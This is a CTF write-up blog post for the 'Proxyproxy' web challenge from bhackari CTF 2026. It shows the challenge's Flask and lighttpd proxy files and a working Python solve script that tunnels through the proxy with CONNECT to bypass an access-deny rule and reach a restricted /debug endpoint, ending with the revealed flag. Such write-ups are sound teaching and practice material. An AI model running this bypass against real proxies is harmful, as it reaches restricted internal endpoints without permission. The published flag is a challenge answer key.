---
layout: post
title:  "Proxyproxy"
date:   2026-06-03 05:46:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /bhackari-CTF-2026-proxyproxy/
---

**Title**: Proxyproxy

**Category**: web

**Author**: sebsrt

**Description**: nothing here pt. 2 Website: [http://proxy.challs.ctf.bhackari.it:3002/](http://proxy.challs.ctf.bhackari.it:3002/)

I get the challenge files:
```shell
unzip proxyproxy.zip  
Archive:  proxyproxy.zip  
   creating: src/  
  inflating: src/docker-compose.yml  
   creating: src/proxy/  
  inflating: src/proxy/Dockerfile  
  inflating: src/proxy/proxy.conf  
   creating: src/backend/  
  inflating: src/backend/Dockerfile  
  inflating: src/backend/server.py  
 extracting: src/backend/requirements.txt
```

`server.py`:
```python
from flask import Flask
import os

app = Flask(__name__)
flag = os.environ.get("FLAG") or "flag{test_flag}"

@app.get("/")
def root():
    return "Nothing here"

@app.post("/debug")
def debug():
    return f"Here is your flag!: {flag}"

if __name__ == "__main__":
    app.run(debug=False, host='0.0.0.0', port=5000)
```

`proxy.conf`:
```shell
server.port = 80
server.document-root = "/tmp"
server.username = "http"
server.groupname = "http"
server.modules = ("mod_proxy","mod_access")

proxy.server = ("/" => (("host" => "backend", "port" => 8000)))

proxy.header = (
    "upgrade" => "enable",
    "connect" => "enable",
    "force-http10" => "enable"
)

url.access-deny = ( "debug" )
```
The proxy allows `CONNECT` with a path of `/`, then tunnels the entire connection to `backend:8000`. The subsequent `POST /debug` will bypass the `url.access-deny` restriction completely. Otherwise you get a 403:
```shell
curl http://proxy.challs.ctf.bhackari.it:3002/debug  
<!DOCTYPE html>  
<html lang="en">  
 <head>  
  <meta charset="UTF-8" />  
  <title>403 Forbidden</title>  
 </head>  
 <body>  
  <h1>403 Forbidden</h1>  
 </body>  
</html>
```

Solve script:
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("proxy.challs.ctf.bhackari.it", 3002))

connect_req = (
    "CONNECT / HTTP/1.1\r\n"
    "Host: backend:8000\r\n"
    "\r\n"
)
s.send(connect_req.encode())

resp = s.recv(1024)
print("Proxy response: ", resp.decode())
if b"200" in resp:
    # send the POST /debug through the tunnel
    post_req = (
        "POST /debug HTTP/1.1\r\n"
        "Host: backend:8000\r\n"
        "Content-Length: 0\r\n"
        "\r\n"
    )
    s.send(post_req.encode())
    flag_resp = s.recv(4096)
    print("Flag: ", flag_resp.decode())
else:
    print("fail :(")

s.close()
```

Output:
```shell
python3 solve.py  
Proxy response:  HTTP/1.1 200 OK  
Connection: close  
Date: Sun, 31 May 2026 09:32:08 GMT  
Server: lighttpd/1.4.83-devel-lighttpd-1.4.82-65-g3651e9be  
  
  
Flag:  HTTP/1.1 200 OK  
Server: gunicorn  
Date: Sun, 31 May 2026 09:32:08 GMT  
Connection: keep-alive  
Content-Type: text/html; charset=utf-8  
Content-Length: 81  
  
Here is your flag!: bhackariCTF{ed7b8baf6bd6341f194a95394c1acd314cee7871de0eb67c}
```

`bhackariCTF{ed7b8baf6bd6341f194a95394c1acd314cee7871de0eb67c}`